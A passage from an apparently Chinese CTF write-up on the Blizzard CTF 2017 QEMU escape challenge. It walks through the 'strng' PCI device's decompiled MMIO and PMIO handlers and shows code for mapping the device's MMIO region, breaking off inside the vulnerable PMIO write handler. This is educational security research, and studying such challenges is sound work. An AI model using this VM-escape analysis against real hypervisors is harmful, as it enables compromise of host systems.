@@ -1,0 +1,409 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<p>通过这题巩固了之前看的qemu的基础知识部分，包括MMIO、PMIO以及QOM编程模型等，这题的特色在于它的漏洞不是存在于MMIO中，而是PMIO中。</p>
+<h2 data-content="1" id="5ea20fe7eabd41c865d449ef9c62c557">描述</h2>
+<p>题目源码的链接为<a href="https://github.com/rcvalle/blizzardctf2017" target="_blank">Blizzard CTF 2017</a>，是qemu逃逸题，<code>flag</code>文件在宿主机中的路径为<code>/root/flag</code>。</p>
+<p>题目的下载路径为<a href="https://github.com/rcvalle/blizzardctf2017/releases" target="_blank">release</a>，启动的命令如下，可以把它保存到<code>launsh.sh</code>中，用<code>sudo ./launsh.sh</code>启动。</p>
+<div class="highlight"><pre><span></span>./qemu-system-x86_64 <span class="se">\</span>
+    -m 1G <span class="se">\</span>
+    -device strng <span class="se">\</span>
+    -hda my-disk.img <span class="se">\</span>
+    -hdb my-seed.img <span class="se">\</span>
+    -nographic <span class="se">\</span>
+    -L pc-bios/ <span class="se">\</span>
+    -enable-kvm <span class="se">\</span>
+    -device e1000,netdev<span class="o">=</span>net0 <span class="se">\</span>
+    -netdev user,id<span class="o">=</span>net0,hostfwd<span class="o">=</span>tcp::5555-:22
+</pre></div>
+<p>该虚拟机是一个<code>Ubuntu Server 14.04 LTS</code>，用户名是<code>ubuntu</code>，密码是<code>passw0rd</code>。因为它把22端口重定向到了宿主机的5555端口，所以可以使用<code>ssh ubuntu@127.0.0.1 -p 5555</code>登进去。</p>
+<h2 data-content="1" id="527f504179a71ca39fcb6cd362fb7237">分析</h2>
+<p><code>sudo ./launsh.sh</code>启动虚拟机，使用用户名是<code>ubuntu</code>，密码是<code>passw0rd</code>进去虚拟机。</p>
+<p>同时将<code>qemu-system-x64_64</code>拖到IDA里面，程序较大，IDA需要个小一会才会分析完成。后续整个分析过程是通过IDA与源码对比查看完成，需要指出的是分析过程将IDA中将变量设置成其对应的结构体会容易看很多。</p>
+<p>在IDA分析完成之前，首先看下虚拟机中的设备等信息。</p>
+<div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lspci
+<span class="m">00</span>:00.0 Host bridge: Intel Corporation 440FX - 82441FX PMC <span class="o">[</span>Natoma<span class="o">]</span> <span class="o">(</span>rev <span class="m">02</span><span class="o">)</span>
+<span class="m">00</span>:01.0 ISA bridge: Intel Corporation 82371SB PIIX3 ISA <span class="o">[</span>Natoma/Triton II<span class="o">]</span>
+<span class="m">00</span>:01.1 IDE interface: Intel Corporation 82371SB PIIX3 IDE <span class="o">[</span>Natoma/Triton II<span class="o">]</span>
+<span class="m">00</span>:01.3 Bridge: Intel Corporation 82371AB/EB/MB PIIX4 ACPI <span class="o">(</span>rev <span class="m">03</span><span class="o">)</span>
+<span class="m">00</span>:02.0 VGA compatible controller: Device <span class="m">1234</span>:1111 <span class="o">(</span>rev <span class="m">02</span><span class="o">)</span>
+<span class="m">00</span>:03.0 Unclassified device <span class="o">[</span>00ff<span class="o">]</span>: Device <span class="m">1234</span>:11e9 <span class="o">(</span>rev <span class="m">10</span><span class="o">)</span>
+<span class="m">00</span>:04.0 Ethernet controller: Intel Corporation 82540EM Gigabit Ethernet Controller <span class="o">(</span>rev <span class="m">03</span><span class="o">)</span>
+</pre></div>
+<p>通过启动命令中的<code>-device strng</code>，我们在IDA中搜索<code>strng</code>相关函数，可以看到相应的函数。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20191023085341-8ea3c002-f52f-1.png"/></p>
+<p>首先是设备的结构体<code>STRNGState</code>的定义：</p>
+<div class="highlight"><pre><span></span><span class="mo">00000000</span> <span class="n">STRNGState</span>      <span class="n">struc</span> <span class="p">;</span> <span class="p">(</span><span class="k">sizeof</span><span class="o">=</span><span class="mh">0xC10</span><span class="p">,</span> <span class="n">align</span><span class="o">=</span><span class="mh">0x10</span><span class="p">,</span> <span class="n">mappedto_3815</span><span class="p">)</span>
+<span class="mo">00000000</span> <span class="n">pdev</span>            <span class="n">PCIDevice_0</span> <span class="o">?</span>
+<span class="mf">000008F</span><span class="mi">0</span> <span class="n">mmio</span>            <span class="n">MemoryRegion_0</span> <span class="o">?</span>
+<span class="mf">000009F</span><span class="mi">0</span> <span class="n">pmio</span>            <span class="n">MemoryRegion_0</span> <span class="o">?</span>
+<span class="mo">00000</span><span class="n">AF0</span> <span class="n">addr</span>            <span class="n">dd</span> <span class="o">?</span>
+<span class="mo">00000</span><span class="n">AF4</span> <span class="n">regs</span>            <span class="n">dd</span> <span class="mi">64</span> <span class="n">dup</span><span class="p">(</span><span class="o">?</span><span class="p">)</span>
+<span class="mo">00000</span><span class="n">BF4</span>                 <span class="n">db</span> <span class="o">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="mo">00000</span><span class="n">BF5</span>                 <span class="n">db</span> <span class="o">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="mo">00000</span><span class="n">BF6</span>                 <span class="n">db</span> <span class="o">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="mo">00000</span><span class="n">BF7</span>                 <span class="n">db</span> <span class="o">?</span> <span class="p">;</span> <span class="n">undefined</span>
+<span class="mo">00000</span><span class="n">BF8</span> <span class="n">srand</span>           <span class="n">dq</span> <span class="o">?</span>                    <span class="p">;</span> <span class="n">offset</span>
+<span class="mo">00000</span><span class="n">C00</span> <span class="n">rand</span>            <span class="n">dq</span> <span class="o">?</span>                    <span class="p">;</span> <span class="n">offset</span>
+<span class="mo">00000</span><span class="n">C08</span> <span class="n">rand_r</span>          <span class="n">dq</span> <span class="o">?</span>                    <span class="p">;</span> <span class="n">offset</span>
+<span class="mo">00000</span><span class="n">C10</span> <span class="n">STRNGState</span>      <span class="n">ends</span>
+</pre></div>
+<p>可以看到它里面存在一个<code>regs</code>数组，大小为256（64*4），后面跟三个函数指针。</p>
+<p>由上篇文章我们知道了<code>pci_strng_register_types</code>会注册由用户提供的<code>TypeInfo</code>，查看该函数并找到了它的<code>TypeInfo</code>，跟进去看到了<code>strng_class_init</code>以及<code>strng_instance_init</code>函数。</p>
+<p>然后先看<code>strng_class_init</code>函数，代码如下（将变量k的类型设置为PCIDeviceClass*）：</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">strng_class_init</span><span class="p">(</span><span class="n">ObjectClass</span> <span class="o">*</span><span class="n">a1</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">data</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">PCIDeviceClass</span> <span class="o">*</span><span class="n">k</span><span class="p">;</span> <span class="c1">// rax</span>
+
+  <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">PCIDeviceClass</span> <span class="o">*</span><span class="p">)</span><span class="n">object_class_dynamic_cast_assert</span><span class="p">(</span>
+                          <span class="n">a1</span><span class="p">,</span>
+                          <span class="s">"pci-device"</span><span class="p">,</span>
+                          <span class="s">"/home/rcvalle/qemu/hw/misc/strng.c"</span><span class="p">,</span>
+                          <span class="mi">154</span><span class="p">,</span>
+                          <span class="s">"strng_class_init"</span><span class="p">);</span>
+  <span class="n">k</span><span class="o">-&gt;</span><span class="n">device_id</span> <span class="o">=</span> <span class="mh">0x11E9</span><span class="p">;</span>
+  <span class="n">k</span><span class="o">-&gt;</span><span class="n">revision</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
+  <span class="n">k</span><span class="o">-&gt;</span><span class="n">realize</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="p">)(</span><span class="n">PCIDevice_0</span> <span class="o">*</span><span class="p">,</span> <span class="n">Error_0</span> <span class="o">**</span><span class="p">))</span><span class="n">pci_strng_realize</span><span class="p">;</span>
+  <span class="n">k</span><span class="o">-&gt;</span><span class="n">class_id</span> <span class="o">=</span> <span class="mh">0xFF</span><span class="p">;</span>
+  <span class="n">k</span><span class="o">-&gt;</span><span class="n">vendor_id</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>可以看到<code>class_init</code>中设置其<code>device_id</code>为<code>0x11e9</code>，<code>vendor_id</code>为<code>0x1234</code>。对应到上面<code>lspci</code>得到的信息，可以知道设备为<code>00:03.0</code>，查看其详细信息：</p>
+<div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ lspci -v -s <span class="m">00</span>:03.0
+<span class="m">00</span>:03.0 Unclassified device <span class="o">[</span>00ff<span class="o">]</span>: Device <span class="m">1234</span>:11e9 <span class="o">(</span>rev <span class="m">10</span><span class="o">)</span>
+        Subsystem: Red Hat, Inc Device <span class="m">1100</span>
+        Physical Slot: <span class="m">3</span>
+        Flags: fast devsel
+        Memory at febf1000 <span class="o">(</span><span class="m">32</span>-bit, non-prefetchable<span class="o">)</span> <span class="o">[</span><span class="nv">size</span><span class="o">=</span><span class="m">256</span><span class="o">]</span>
+        I/O ports at c050 <span class="o">[</span><span class="nv">size</span><span class="o">=</span><span class="m">8</span><span class="o">]</span>
+</pre></div>
+<p>可以看到有MMIO地址为<code>0xfebf1000</code>，大小为256；PMIO地址为<code>0xc050</code>，总共有8个端口。</p>
+<p>然后查看<code>resource</code>文件：</p>
+<div class="highlight"><pre><span></span>root@ubuntu:~# cat /sys/devices/pci0000<span class="se">\:</span><span class="m">00</span>/0000<span class="se">\:</span><span class="m">00</span><span class="se">\:</span><span class="m">03</span>.0/resource
+0x00000000febf1000 0x00000000febf10ff 0x0000000000040200
+0x000000000000c050 0x000000000000c057 0x0000000000040101
+0x0000000000000000 0x0000000000000000 0x0000000000000000
+</pre></div>
+<p><code>resource0</code>对应的是MMIO，而<code>resource1</code>对应的是PMIO。<code>resource</code>中数据格式是<code>start-address end-address flags</code>。</p>
+<p>也可以查看<code>/proc/ioports</code>来查看各个设备对应的I/O端口，<code>/proc/iomem</code>查看其对应的I/O memory地址（需要用root帐号查看，否则看不到端口或地址）：</p>
+<div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ sudo cat /proc/iomem
+...
+  febf1000-febf10ff : <span class="m">0000</span>:00:03.0
+...
+ubuntu@ubuntu:~$ sudo cat /proc/ioports
+...
+  c050-c057 : <span class="m">0000</span>:00:03.0
+</pre></div>
+<p><code>/sys/devices</code>其对应的设备下也有相应的信息，如<code>deviceid</code>和<code>vendorid</code>等：</p>
+<div class="highlight"><pre><span></span>ubuntu@ubuntu:~$ ls /sys/devices/pci0000<span class="se">\:</span><span class="m">00</span>/0000<span class="se">\:</span><span class="m">00</span><span class="se">\:</span><span class="m">03</span>.0
+broken_parity_status      <span class="nb">enable</span>         power      subsystem_device
+class                     firmware_node  remove     subsystem_vendor
+config                    irq            rescan     uevent
+consistent_dma_mask_bits  local_cpulist  resource   vendor
+d3cold_allowed            local_cpus     resource0
+device                    modalias       resource1
+dma_mask_bits             msi_bus        subsystem
+ubuntu@ubuntu:~$ cat /sys/devices/pci0000<span class="se">\:</span><span class="m">00</span>/0000<span class="se">\:</span><span class="m">00</span><span class="se">\:</span><span class="m">03</span>.0/class
+0x00ff00
+ubuntu@ubuntu:~$ cat /sys/devices/pci0000<span class="se">\:</span><span class="m">00</span>/0000<span class="se">\:</span><span class="m">00</span><span class="se">\:</span><span class="m">03</span>.0/vendor
+0x1234
+ubuntu@ubuntu:~$ cat /sys/devices/pci0000<span class="se">\:</span><span class="m">00</span>/0000<span class="se">\:</span><span class="m">00</span><span class="se">\:</span><span class="m">03</span>.0/device
+0x11e9
+</pre></div>
+<p>看完<code>strng_class_init</code>后，看<code>strng_instance_init</code>函数，该函数则是为<code>strng</code> Object赋值了相应的函数指针值<code>srand</code>、<code>rand</code>以及<code>rand_r</code>。</p>
+<p>然后去看<code>pci_strng_realize</code>，该函数注册了MMIO和PMIO空间，包括mmio的操作结构<code>strng_mmio_ops</code>及其大小<code>256</code>；pmio的操作结构体<code>strng_pmio_ops</code>及其大小8。</p>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">pci_strng_realize</span><span class="p">(</span><span class="n">STRNGState</span> <span class="o">*</span><span class="n">pdev</span><span class="p">,</span> <span class="n">Error_0</span> <span class="o">**</span><span class="n">errp</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v2</span><span class="p">;</span> <span class="c1">// ST08_8</span>
+
+  <span class="n">v2</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="n">memory_region_init_io</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">mmio</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">pdev</span><span class="p">.</span><span class="n">qdev</span><span class="p">.</span><span class="n">parent_obj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">strng_mmio_ops</span><span class="p">,</span> <span class="n">pdev</span><span class="p">,</span> <span class="s">"strng-mmio"</span><span class="p">,</span> <span class="mh">0x100uLL</span><span class="p">);</span>
+  <span class="n">pci_register_bar</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">pdev</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">mmio</span><span class="p">);</span>
+  <span class="n">memory_region_init_io</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">pmio</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">pdev</span><span class="p">.</span><span class="n">qdev</span><span class="p">.</span><span class="n">parent_obj</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">strng_pmio_ops</span><span class="p">,</span> <span class="n">pdev</span><span class="p">,</span> <span class="s">"strng-pmio"</span><span class="p">,</span> <span class="mi">8uLL</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">==</span> <span class="n">v2</span> <span class="p">)</span>
+    <span class="n">pci_register_bar</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">pdev</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1u</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pdev</span><span class="o">-&gt;</span><span class="n">pmio</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<p><code>strng_mmio_ops</code>中有访问mmio对应的<code>strng_mmio_read</code>以及<code>strng_mmio_write</code>；<code>strng_pmio_ops</code>中有访问pmio对应的<code>strng_pmio_read</code>以及<code>strng_pmio_write</code>，下面将详细分析这两部分，一般来说，设备的问题也容易出现在这两个部分。</p>
+<h3 data-content="1" id="f4a448c259316e0b32d8d5e552193b33">MMIO</h3>
+<h4 data-content="1" id="14299fdd22bc0474aed6138966a641bb">strng_mmio_read</h4>
+<div class="highlight"><pre><span></span><span class="kt">uint64_t</span> <span class="kr">__fastcall</span> <span class="nf">strng_mmio_read</span><span class="p">(</span><span class="n">STRNGState</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">uint64_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+
+  <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">)</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">];</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>读入addr将其右移两位，作为<code>regs</code>的索引返回该寄存器的值。</p>
+<h4 data-content="1" id="00235301f92abe5c037731b79bf595c9">strng_mmio_write</h4>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">strng_mmio_write</span><span class="p">(</span><span class="n">STRNGState</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">val</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">hwaddr</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// rsi</span>
+  <span class="kt">uint32_t</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// ST08_4</span>
+  <span class="kt">uint32_t</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v7</span><span class="p">;</span> <span class="c1">// [rsp+18h] [rbp-20h]</span>
+
+  <span class="n">v7</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="p">(</span><span class="n">addr</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="n">i</span> <span class="o">=</span> <span class="n">addr</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">i</span> <span class="o">==</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">rand</span><span class="p">(</span><span class="n">opaque</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">1</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">)</span> <span class="o">==</span> <span class="n">v7</span> <span class="p">)</span>
+        <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">srand</span><span class="p">(</span><span class="n">val</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">_DWORD</span><span class="p">)</span><span class="n">i</span> <span class="o">==</span> <span class="mi">3</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">v5</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+        <span class="n">v6</span> <span class="o">=</span> <span class="p">((</span><span class="kr">__int64</span> <span class="p">(</span><span class="kr">__fastcall</span> <span class="o">*</span><span class="p">)(</span><span class="kt">uint32_t</span> <span class="o">*</span><span class="p">))</span><span class="n">opaque</span><span class="o">-&gt;</span><span class="n">rand_r</span><span class="p">)(</span><span class="o">&amp;</span><span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
+        <span class="n">val</span> <span class="o">=</span> <span class="n">v5</span><span class="p">;</span>
+        <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">v6</span><span class="p">;</span>
+      <span class="p">}</span>
+      <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[(</span><span class="kt">unsigned</span> <span class="kt">int</span><span class="p">)</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">val</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+<span class="p">}</span>
+</pre></div>
+<p>当<code>size</code>等于4时，将<code>addr</code>右移两位得到寄存器的索引<code>i</code>，并提供4个功能：</p>
+<ul>
+<li>当<code>i</code>为0时，调用<code>srand</code>函数但并不给赋值给内存。</li>
+<li>当<code>i</code>为1时，调用rand得到随机数并赋值给<code>regs[1]</code>。</li>
+<li>当<code>i</code>为3时，调用<code>rand_r</code>函数，并使用<code>regs[2]</code>的地址作为参数，并最后将返回值赋值给<code>regs[3]</code>，但后续仍然会将<code>val</code>值覆盖到<code>regs[3]</code>中。</li>
+<li>其余则直接将传入的<code>val</code>值赋值给<code>regs[i]</code>。</li>
+</ul>
+<p>看起来似乎是<code>addr</code>可以由我们控制，可以使用<code>addr</code>来越界读写<code>regs</code>数组。即如果传入的addr大于regs的边界，那么我们就可以读写到后面的函数指针了。但是事实上是不可以的，前面已经知道了<code>mmio</code>空间大小为256，我们传入的addr是不能大于<code>mmio</code>的大小；因为pci设备内部会进行检查，而刚好<code>regs</code>的大小为256，所以我们无法通过<code>mmio</code>进行越界读写。</p>
+<h4 data-content="1" id="af3c6ea529ede45efd59623a4b20a8a0">编程访问MMIO</h4>
+<p>实现对MMIO空间的访问，比较便捷的方式就是使用<code>mmap</code>函数将设备的<code>resource0</code>文件映射到内存中，再进行相应的读写即可实现MMIO的读写，典型代码如下：</p>
+<div class="highlight"><pre><span></span><span class="kt">unsigned</span> <span class="kt">char</span><span class="o">*</span> <span class="n">mmio_mem</span><span class="p">;</span>
+
+<span class="kt">void</span> <span class="nf">mmio_write</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">value</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">))</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="kt">uint32_t</span> <span class="nf">mmio_read</span><span class="p">(</span><span class="kt">uint32_t</span> <span class="n">addr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">return</span> <span class="o">*</span><span class="p">((</span><span class="kt">uint32_t</span><span class="o">*</span><span class="p">)(</span><span class="n">mmio_mem</span> <span class="o">+</span> <span class="n">addr</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
+<span class="p">{</span>
+
+    <span class="c1">// Open and map I/O memory for the strng device</span>
+    <span class="kt">int</span> <span class="n">mmio_fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">"/sys/devices/pci0000:00/0000:00:03.0/resource0"</span><span class="p">,</span> <span class="n">O_RDWR</span> <span class="o">|</span> <span class="n">O_SYNC</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_fd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">die</span><span class="p">(</span><span class="s">"mmio_fd open failed"</span><span class="p">);</span>
+
+    <span class="n">mmio_mem</span> <span class="o">=</span> <span class="n">mmap</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="n">PROT_READ</span> <span class="o">|</span> <span class="n">PROT_WRITE</span><span class="p">,</span> <span class="n">MAP_SHARED</span><span class="p">,</span> <span class="n">mmio_fd</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">mmio_mem</span> <span class="o">==</span> <span class="n">MAP_FAILED</span><span class="p">)</span>
+        <span class="n">die</span><span class="p">(</span><span class="s">"mmap mmio_mem failed"</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+<h3 data-content="1" id="7ed0c789d7fab6ab9714167b073d3dba">PMIO</h3>
+<p>通过前面的分析我们知道<code>strng</code>有八个端口，端口起始地址为<code>0xc050</code>，相应的通过<code>strng_pmio_read</code>和<code>strng_pmio_write</code>去读写。</p>
+<h4 data-content="1" id="c2f3b8fb41b55ab523c11293a73716dd">strng_pmio_read</h4>
+<div class="highlight"><pre><span></span><span class="kt">uint64_t</span> <span class="kr">__fastcall</span> <span class="nf">strng_pmio_read</span><span class="p">(</span><span class="n">STRNGState</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">uint64_t</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">uint32_t</span> <span class="n">reg_addr</span><span class="p">;</span> <span class="c1">// edx</span>
+
+  <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">addr</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">addr</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">reg_addr</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="n">reg_addr</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">)</span>
+          <span class="n">result</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">reg_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">];</span>
+      <span class="p">}</span>
+    <span class="p">}</span>
+    <span class="k">else</span>
+    <span class="p">{</span>
+      <span class="n">result</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></div>
+<p>当端口地址为0时直接返回<code>opaque-&gt;addr</code>，否则将<code>opaque-&gt;addr</code>右移两位作为索引<code>i</code>，返回<code>regs[i]</code>的值，比较关注的是这个<code>opaque-&gt;addr</code>在哪里赋值，它在下面的<code>strng_pmio_write</code>中被赋值。</p>
+<h4 data-content="1" id="4d5dcc218674cad98a7df05d009ad599">strng_pmio_write</h4>
+<div class="highlight"><pre><span></span><span class="kt">void</span> <span class="kr">__fastcall</span> <span class="nf">strng_pmio_write</span><span class="p">(</span><span class="n">STRNGState</span> <span class="o">*</span><span class="n">opaque</span><span class="p">,</span> <span class="n">hwaddr</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">size</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">uint32_t</span> <span class="n">reg_addr</span><span class="p">;</span> <span class="c1">// eax</span>
+  <span class="kr">__int64</span> <span class="n">idx</span><span class="p">;</span> <span class="c1">// rax</span>
+  <span class="kt">unsigned</span> <span class="kr">__int64</span> <span class="n">v6</span><span class="p">;</span> <span class="c1">// [rsp+8h] [rbp-10h]</span>
+
+  <span class="n">v6</span> <span class="o">=</span> <span class="n">__readfsqword</span><span class="p">(</span><span class="mh">0x28u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">size</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span> <span class="n">addr</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="n">addr</span> <span class="o">==</span> <span class="mi">4</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">reg_addr</span> <span class="o">=</span> <span class="n">opaque</span><span class="o">-&gt;</span><span class="n">addr</span><span class="p">;</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="p">(</span><span class="n">reg_addr</span> <span class="o">&amp;</span> <span class="mi">3</span><span class="p">)</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">idx</span> <span class="o">=</span> <span class="n">reg_addr</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">;</span>
